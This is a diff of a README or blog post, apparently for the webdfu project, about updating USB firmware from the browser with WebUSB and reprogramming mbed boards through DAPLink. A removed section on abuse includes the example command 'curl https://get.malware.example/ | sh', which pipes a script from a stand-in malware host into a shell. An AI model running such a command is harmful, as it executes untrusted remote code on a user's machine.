@@ -11,57 +11,62 @@ It does not require the user to install browser plugins or proxy agents that cou
 Note: WebUSB is currently a draft standard that is only implemented by Google Chrome.
 
 ## Potential for abuse
-Putting the words "web" and "firmware" in the same sentence is likely to provoke a negative gut reaction from security-minded folks, so before we go any further, let's address this.
-
-Any device with an unsecured bootloader that allows unrestricted access to it can be compromised if a malicious party gets access to it even once.
-Depending on the nature of the bootloader and the malware, it may be irreversible and even undetectable.
-This risk is not unique to firmware updates delivered from the browser.
-Here's a non-comprehensive list of ways you can inadvertently compromise a USB device without involving WebUSB:
-  
-  * Leaving your device unattended in a public place, where anyone could pick it up, reflash it, and replace it.
-  * Downloading and manually installing a malicious firmware update from a compromised website without first verifying the checksum.
-  * Running `curl https://get.malware.example/ | sh` and subsequently plugging your device in.
-
-We should strive to phase out devices that are vulnerable to these kinds of attacks, but in the meantime, there are millions of existing devices out in the wild that WebUSB opens up access to use for benevolent purposes.
+Giving any untrusted code access to your USB devices is dangerous, but especially so when the device is fully reprogrammable and could be converted into a malicious device ala [BadUSB](https://arstechnica.com/information-technology/2014/07/this-thumbdrive-hacks-computers-badusb-exploit-makes-devices-turn-evil/).
+Ideally, firmware updates should require some combination of physical access (a bootloader button), multiple user prompts, and cryptographically signed firmware images to reduce the risk of BadUSB-type attack.
 
 ## Applications
 
 ### Standalone firmware updates in the browser
 The simplest application for WebUSB and firmware updates is to implement [dfu-util](http://dfu-util.sourceforge.net/) in a cross-platform browser application. dfu-util uses libusb to directly schedule the USB control transfers needed to execute a USB DFU firmware update. Since WebUSB offers a similar degree of low-level transfer-oriented API access, it's a straightforward exercise to port the necessary parts of dfu-util from C to javascript.
 
-This could be used to build a rich firmware updater that can intelligently display release notes and update the device without installing any native software.
+I've put together an [online demo](https://devanlai.github.io/webdfu/dfu-util/) that offers similar functionality to dfu-util. It supports basic DFU 1.1 functionality like switching to the bootloader over USB, downloading new firmware, and reading out the device firmware. It also has preliminary support for [STMicro's DfuSe 1.1a](http://dfu-util.sourceforge.net/dfuse.html) extensions, which I've tested successfully with the on-chip USB bootloader on STM32F042xx chips.
 
-A live demo of a dfu-util-like site can be viewed online [here](https://devanlai.github.io/webdfu/dfu-util/).
 
-The demo has been successfully tested on Linux with USB DFU 1.1 and USB DfuSe 1.1a devices. It should work on macOS and Windows as well, but WebUSB support is still evolving, so there may be issues.
+In the future, this could be used to build a rich firmware updater that guides the user through the process of putting their device into firmware-upgrade mode and selecting the correct firmware image.
 
 ### Online IDEs with hardware access
-Sites such as [mbed.org](https://developer.mbed.org), [codebender](https://codebender.cc), and [Arduino Create](https://create.arduino.cc/) show that there are real use cases for online IDEs for firmware.
+Sites such as [mbed.org](https://developer.mbed.org), [codebender](https://codebender.cc), and [Arduino Create](https://create.arduino.cc/) show that there are real applications for online IDEs for embedded development. Compared to native software, web applications are well-suited to cross-platform compatibility, automatic cloud storage, and online collaboration.
 
-However, there is a critical gap in-between writing code in the browser and flashing that code onto a development board.
-In the case of mbed, the user has to manually drag and drop the compiled firmware onto an emulated USB drive that then reprograms the board. For codebender and Arduino Create, the user must install special browser plugins or native software to allow the website to access the board.
+However, embedded development is more than just writing code and compiling it. Embedded software lives in realm of hardware beyond the confines of our day-to-day operating systems running on general purpose computers. Without some way to take your code out of your computer and into the microcontroller on your desk, you may as well be blinking pixels on the monitor.
 
-With WebUSB, it's possible for the IDE to directly talk to the development board, creating a first class, seamless experience comparable to a native IDE, while retaining the benefits of automatic updates, cloud storage, and social code sharing.
+So how do IDEs like mbed bridge the gap today?
 
-Alas, as the mbed IDE is still closed source, we'll have to settle for something with a few more seams than we'd like.
+Every mbed-enabled board has two microcontrollers - the target microcontroller that controls the actual hardware on the board and an interface microcontroller that mediates communication between the PC and the target microcontroller via USB.
+Depending on the age of the board and the manufacturer, the firmware on the interface chip might be called [CMSIS-DAP](https://developer.mbed.org/handbook/CMSIS-DAP), [OpenSDA](https://www.nxp.com/products/microcontrollers-and-processors/arm-based-processors-and-mcus/kinetis-cortex-m-mcus/developer-resources/ides-for-kinetis-mcus/opensda-serial-and-debug-adapter:OPENSDA), STLink/v2-1, or [DAPLink](https://developer.mbed.org/handbook/DAPLink).
+Regardless of the name, all of the interface chips allow the user to flash the target chip by dragging and dropping compiled firmware binaries onto an emulated USB mass storage drive. Thus, a typical development cycle with mbed looks like:  
 
-One of the defining characteristics of mbed development boards is that they have an additional interface microcontroller that handles reprogramming the actual target chip from USB. It would be great if we could use WebUSB to talk to that interface microcontroller and tell it to reprogram the target.
+1. Write some code on mbed.org
+2. Compile the code and download the firmware binary
+3. Copy the binary from the download directory to the emulated drive and hit reset
+4. Troubleshoot the new code with external tools and software
+5. Return to step 1
 
-Unfortunately, the programming is handled by repurposing USB mass storage and USB HID, both of which already have standard operating system drivers that WebUSB won't try to mess with. 
+The software involved to make all of this work out-of-the-box across multiple pldatforms is quite clever, but it has some limitations:
 
-Fortunately for us, the firmware for most of those interface chips _is_ open-source as part of the [DAPLink](https://developer.mbed.org/handbook/DAPLink) project, so we can add a custom USB interface just for WebUSB. In this particular case, it was easiest for me to add [another USB DFU interface](https://github.com/devanlai/DAPLink), so the existing WebUSB DFU work above also works here.
+* The user must manually copy the firmware onto the board every time.
+* Mass storage device emulation is a moving target - it's difficult to future-proof against OS driver and filesystem changes.
+* The IDE has no way to directly interact with the board - it can't retrieve serial log messages or read the microcontroller's registers.
 
-So we've got a website that can talk to USB DFU devices and interface firmware that can reprogram the target chip using USB DFU, what else do we need? I'd love to add a free, cloud-hosted IDE, but I don't have the time or money to build one of those. Luckily, while the mbed IDE isn't open-source, you can leverage their online compiler through their [remote compilation API](https://developer.mbed.org/handbook/Compile-API) to build projects online.
+With WebUSB, we could potentially resolve all of those issues:
 
-The very rough live demo for all of this can be accessed [here](https://devanlai.github.io/webdfu/mbed-download/).
+* The browser can talk directly to the interface chip via WebUSB, eliminating the manual drag'n'drop step.
+* Since WebUSB doesn't depend on OS-level application drivers, it's no longer necessary to tunnel everything through the lowest-common-denominator of drivers to build something that works out-of-the-box everywhere.
+* With a custom USB protocol, the browser can access the full capabilities of the interface chip, which include on-chip debugging and bidirectional serial communication with the target chip.
+
+
+Alas, as I am only one man and the mbed IDE itself is closed source, I don't have the time and resources to build a fully enabled online IDE that interfaces directly with the hardware. What I do have is a [proof-of-concept](https://devanlai.github.io/webdfu/mbed-download/) that cuts out the pesky drag'n'drop step, allowing a direct download from the browser to the target microcontroller without leaving the browser.
+
+
+Unlike the IDE, the interface firmware is fully open source as part of the [DAPLink](https://developer.mbed.org/handbook/DAPLink) project. I [forked](https://github.com/devanlai/DAPLink) the DAPLink project and added a standard USB DFU interface to the DAPLink firmware, except it reprograms the target chip instead of itself. Armed with a WebUSB DFU driver and USB DFU compatible interface firmware, we've got everything we need to reprogram mbed boards from the browser.
+
+Still, it's not much of an improvement if all we've done is flip it around so that we have to compile code outside of the browser and then flash it from the browser instead of vice versa.
+
+Luckily, while the mbed IDE isn't open-source, we can still leverage their online compiler through their [remote compilation API](https://developer.mbed.org/handbook/Compile-API) to build projects online. With my demo, you can select programs from your workspace or published examples and compile and flash them from entirely within the browser. It's a bit awkward since the authentication method is terrible and you still have to edit your code in a second tab, but it's a start.
 
 ## Sources on GitHub
 
 * WebUSB demo code: [webdfu](https://github.com/devanlai/webdfu)
 * DAPLink with DFU and WebUSB: [daplink](https://github.com/devanlai/DAPLink)
 
-## Future work
-
-While it was expedient to add USB DFU to the DAPLink, there's no reason why we couldn't add another USB interface that provides full access to the debugging capabilities already present in the DAPLink firmware.
-
-I'd like to extend it so that it's possible to set breakpoints and inspect peripheral registers on my development boards, all from an in-browser IDE that requires zero-installation.
+## Other Resources
+Check out the [dapjs](https://github.com/ARMmbed/dapjs-web-demo) project for similar ideas by someone else.
